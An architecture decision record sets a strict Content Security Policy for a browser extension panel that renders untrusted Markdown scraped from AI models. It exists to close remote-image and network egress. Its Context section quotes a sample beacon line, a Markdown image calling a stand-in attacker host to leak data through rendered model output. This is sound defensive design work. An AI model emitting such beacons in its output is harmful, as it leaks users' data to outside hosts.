# ADR-0008: Content Security Policy for extension pages

- **Status:** Accepted
- **Date:** 2026-07-18

## Context

The side panel renders **untrusted, model-scraped Markdown** (ADR-0002 drives web
UIs and scrapes their output). MV3's default extension-page CSP restricts
`script-src`/`object-src` to `'self'` but leaves `img-src` and `connect-src` open.
That means a scraped `![](https://attacker/pixel?leak)` would fire an outbound
request when rendered — a tracking/exfiltration beacon that quietly contradicts
the project's "no background network calls" guarantee (PRD §2, Constraint 2;
OWASP LLM02/LLM05).

## Decision

We will declare an explicit `content_security_policy.extension_pages` in
`manifest.config.js`:

```
script-src 'self'; object-src 'self'; img-src 'self' data:;
connect-src 'self'; style-src 'self' 'unsafe-inline'; base-uri 'self'; frame-src 'none'
```

- `img-src 'self' data:` — no remote image beacons from rendered output.
- `connect-src 'self'` — no fetch/XHR/WebSocket egress to any external host.
- `style-src 'unsafe-inline'` — required for the React inline `style=` attributes
  used throughout the UI (member colors, stage tints). Scripts remain `'self'`.

This complements the renderer-level defenses (no `rehype-raw`; scheme-restricted
link/image URLs in `src/ui/Markdown.jsx`).

## Consequences

- Restores the "no network egress" property for the panel at the platform layer,
  independent of what any dependency does with the Markdown.
- **Inline/remote images in provider answers will not load** in the panel (they
  render as broken image refs). This is the accepted trade-off for closing the
  beacon channel; text, code, tables, and diagrams are unaffected.
- Any future need to load an external resource forces a deliberate, reviewed CSP
  change rather than being silently possible.

## Alternatives considered

- **`img-src https:`** — would let provider images render but reopens the exact
  exfiltration/tracking vector we are closing. Rejected.
- **Sanitize image URLs only, no CSP.** Weaker: relies solely on renderer code and
  wouldn't catch egress introduced by a future dependency. The CSP is the backstop.
